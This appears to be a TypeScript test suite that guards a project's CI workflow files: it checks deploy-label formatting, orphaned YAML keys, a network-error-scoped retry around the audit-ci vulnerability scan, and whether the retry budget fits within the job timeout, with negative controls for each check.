          problems.push(`${file}:${i + 1} DEPLOY_MESSAGE is \`${value}\` — it contains a space`)
        }
      }
    }
    expect(
      problems,
      'A deploy label with a space in it is re-split by the shell that opennextjs-\n' +
        'cloudflare uses to invoke wrangler, and the trailing word becomes wrangler\u2019s\n' +
        '`[script]` positional. Join the parts with `@` or `-`, never a space.\n' +
        `${problems.join('\n')}`,
    ).toEqual([])
  })

  it('the DEPLOY_MESSAGE rule can actually fail (negative control)', () => {
    const deployMessageValue = (line: string) =>
      /^\s*DEPLOY_MESSAGE:\s*(.+?)\s*$/.exec(line)?.[1]?.replace(/\$\{\{[^}]*\}\}/g, 'X')
    expect(/\s/.test(deployMessageValue('          DEPLOY_MESSAGE: abc123 main') ?? '')).toBe(true)
    expect(/\s/.test(deployMessageValue('          DEPLOY_MESSAGE: abc123@main') ?? '')).toBe(false)
    // The real shapes: an expression pair joined by `@` is FINE, separated by a space
    // is NOT — even though both contain spaces before the blanking step.
    //
    // Assembled from fragments because a literal `$`+`{{` in a TS string trips biome's
    // noTemplateCurlyInString, exactly as the parse-guard control above records.
    const EXPR_A = `$${'{{'} github.sha }}`
    const EXPR_B = `$${'{{'} github.ref_name }}`
    expect(
      /\s/.test(deployMessageValue(`          DEPLOY_MESSAGE: ${EXPR_A}@${EXPR_B}`) ?? ''),
    ).toBe(false)
    expect(
      /\s/.test(deployMessageValue(`          DEPLOY_MESSAGE: ${EXPR_A} ${EXPR_B}`) ?? ''),
    ).toBe(true)
    // And the matcher must not fire on an unrelated line, or every workflow fails.
    expect(deployMessageValue('          CLOUDFLARE_ACCOUNT_ID: abc')).toBeUndefined()
  })

  it('the watched-workflow rule can actually fail (negative control)', () => {
    // A watched name that does not resolve, and a watched file that parses to no jobs.
    expect(existsSync(join(WORKFLOW_DIR, 'no-such-workflow.yml'))).toBe(false)
    expect(declaredJobs('on:\n  push:\n')).toEqual([])
    // …and the real list must not be empty, or the loop above would assert nothing.
    const watched = [...read('heartbeat.yml').matchAll(/^\s*([A-Za-z0-9._-]+\.ya?ml):\d+:/gm)]
    expect(watched.length).toBeGreaterThanOrEqual(4)
  })

  it('the parse guard can actually fail (negative control)', () => {
    // The exact shape shipped in this PR: `env:` removed, GH_TOKEN left behind.
    const broken = [
      'jobs:',
      '  digest:',
      '    runs-on: ubuntu-latest',
      '    timeout-minutes: 10',
      // The VALUE is irrelevant to the rule and is written plainly here on purpose:
      // a literal `${{ … }}` in a TS string trips biome's noTemplateCurlyInString.
      "      GH_TOKEN: <the workflow's own token>",
      '    steps:',
      '      - run: echo hi',
    ].join('\n')
    expect(orphanedKeys(broken)).toHaveLength(1)
    expect(orphanedKeys(broken)[0]?.text).toContain('GH_TOKEN')

    // And legitimate nesting must NOT trip it, or the rule above is unusable.
    const fine = [
      'jobs:',
      '  build:',
      '    runs-on: ubuntu-latest',
      '    env:',
      '      TOKEN: abc',
      '    steps:',
      '      - name: x',
      '        run: |',
      '          deeper: this is shell, not yaml',
      '      - name: y',
      '        env:',
      '          A: b',
    ].join('\n')
    expect(orphanedKeys(fine)).toEqual([])
  })

  /**
   * THE AUDIT STEP'S RETRY MUST STAY SCOPED TO THE NETWORK ERROR.
   *
   * `audit-ci` exits 1 both when it finds a high/critical advisory and when it cannot
   * reach the registry — and `deploy` lists the audit job in `needs`. On 2026-09-04 a
   * degraded runner blocked the production deploy FIVE times while the same audit passed
   * locally on the same commit: `code ERR_SOCKET_TIMEOUT: undefined`, and decisively no
   * advisory list, because audit-ci prints one when it finds something.
   *
   * So the step retries, but only on that signature; a finding still fails on the first
   * attempt. What this pins is a well-meant simplification: dropping the guard, or
   * reaching for `--pass-enoaudit`, would turn "the registry was unreachable" into a PASS
   * and let a real advisory ship on a flaky day. audit-ci's own `retry-count` cannot be
   * used instead — it is keyed on message matching and upstream ships
   * `pnpm: []  // TODO: Identify retry-able error message for pnpm`.
   *
   * Read off the source string like every other guard here, for the reason in this file's
   * header: no YAML dependency to prune out from under it.
   */
  /**
   * The `run:` block that invokes audit-ci, with comment lines stripped.
   *
   * Both halves matter. Isolating the BLOCK stops an assertion matching shell from an
   * unrelated step; stripping COMMENTS stops it matching the step's own prose — the first
   * draft of this test failed because the block's comment mentions `--pass-enoaudit` while
   * explaining why that flag is inert, which is exactly the string the check forbids.
   */
  function auditSteps(source: string): string[] {
    const blocks: string[][] = []
    for (const { line } of shellLines(source)) {
      if (/^\s*(?:- )?run:/.test(line)) blocks.push([])
      blocks.at(-1)?.push(line)
    }
    return blocks
      .map((block) => block.filter((line) => !/^\s*#/.test(line)).join('\n'))
      .filter((block) => block.includes('audit-ci'))
  }

  it('retries the vulnerability audit only on the network signature, never on a finding', async () => {
    const found: { name: string; shell: string }[] = []
    for (const name of await workflowFiles()) {
      for (const shell of auditSteps(read(name))) found.push({ name, shell })
    }

    // The guard must not pass by finding nothing.
    expect(found.length).toBeGreaterThan(0)

    for (const { name, shell } of found) {
      expect(shell, `${name}: the audit step must retry`).toMatch(/for\s+\w+\s+in/)
      expect(shell, `${name}: the retry must be gated on ERR_SOCKET_TIMEOUT`).toContain(
        'ERR_SOCKET_TIMEOUT',
      )
      expect(shell, `${name}: a finding must not be retried`).toMatch(/not retrying/i)
      expect(
        shell,
        `${name}: --pass-enoaudit would turn an unreachable registry into a pass`,
      ).not.toContain('--pass-enoaudit')
    }
  })

  /**
   * The retry budget must fit the job that runs it.
   *
   * ⚠️ THIS EXISTS BECAUSE THE RETRY SHIPPED WITH THE WRONG ARITHMETIC. At 3 attempts the
   * audit job died at its own 20-minute ceiling mid-attempt-3 on the very next run, and a
   * budget death reports as `cancelled` — indistinguishable at a glance from a second push
   * having killed the run, which CLAUDE.md warns about for exactly this reason. The two
   * measurements needed were already sitting in the workflow comment; only the multiplication
   * was missing. So the numbers are pinned here where they cannot drift apart silently.
   *
   * Measured 2026-09-04 on run 33859265482: `pnpm/action-setup` 426 s, checkout + setup-node
   * + install 31 s, and a failing `audit-ci` attempt 251 s then 266 s.
   */
  const FIXED_JOB_OVERHEAD_SECONDS = 460
  const FAILING_ATTEMPT_SECONDS = 270
  const SLEEP_BETWEEN_ATTEMPTS_SECONDS = 15

  function worstCaseSeconds(attempts: number): number {
    return (
      FIXED_JOB_OVERHEAD_SECONDS +
      attempts * FAILING_ATTEMPT_SECONDS +
      (attempts - 1) * SLEEP_BETWEEN_ATTEMPTS_SECONDS
    )
  }

  it('every audit retry budget fits inside its own job timeout', async () => {
    const checked: string[] = []
    for (const name of await workflowFiles()) {
      const source = read(name)
      for (const shell of auditSteps(source)) {
        const attempts = Number(/attempts=(\d+)/.exec(shell)?.[1])
        expect(attempts, `${name}: the audit step must declare an attempt count`).toBeGreaterThan(0)

        // The `timeout-minutes` of the job this step belongs to: the nearest one ABOVE the
        // step, so a job reordering cannot quietly re-point it.
        //
        // ⚠️ ANCHOR ON `attempts=N`, NOT ON THE STEP'S FIRST LINE. The first draft of this
        // test anchored on `shell.split('\n')[0]`, which is the literal `run: |` — a line
        // that appears in every job. `indexOf` therefore found the FIRST one in the file and
        // read an unrelated job's 30-minute ceiling, so `attempts=3` inside a 20-minute job
        // sailed through. The negative control below is what caught it: written to fail, it
        // passed. `attempts=` occurs exactly once per workflow, which is why it is the anchor.
        const anchor = source.indexOf(`attempts=${attempts}`)
        expect(anchor, `${name}: could not locate the attempts= line`).toBeGreaterThan(0)
        const upToStep = source.slice(0, anchor)
        const timeout = Number([...upToStep.matchAll(/timeout-minutes:\s*(\d+)/g)].at(-1)?.[1])
        expect(timeout, `${name}: the audit job must set timeout-minutes`).toBeGreaterThan(0)

        const worst = worstCaseSeconds(attempts)
        expect(
          worst,
          `${name}: ${attempts} attempts need ${(worst / 60).toFixed(1)} min worst case but the job allows ${timeout} min — the job will be CANCELLED mid-attempt, which reads as a cancelled run rather than a failure`,
        ).toBeLessThanOrEqual(timeout * 60)
        checked.push(`${name}:${attempts}/${timeout}m`)
      }
    }
    // Must not pass by finding nothing to check.
    expect(checked.length).toBeGreaterThan(0)
  })

  it('the budget check fails at the count that actually died (negative control)', () => {
    // 3 attempts inside 20 minutes is precisely what was cancelled on 2026-09-04.
    expect(worstCaseSeconds(3)).toBeGreaterThan(20 * 60)
    expect(worstCaseSeconds(2)).toBeLessThanOrEqual(20 * 60)
  })

  it('the audit-retry check can actually fail (negative control)', () => {
    // The step as it stood until 2026-09-04: one command, no loop, no signature guard.
    const bare = [
      'jobs:',
      '  audit:',
      '    steps:',
      '      - run: pnpm exec audit-ci --config audit-ci.jsonc',
    ].join('\n')
    const shell = auditSteps(bare)
    expect(shell).toHaveLength(1)
    expect(shell[0]).not.toMatch(/for\s+\w+\s+in/)
    expect(shell[0]).not.toContain('ERR_SOCKET_TIMEOUT')
    expect(shell[0]).not.toMatch(/not retrying/i)

    // And a step reaching for the inert flag must be caught.
    const withEnoaudit = bare.replace('audit-ci.jsonc', 'audit-ci.jsonc --pass-enoaudit')
    expect(auditSteps(withEnoaudit)[0]).toContain('--pass-enoaudit')
  })
})
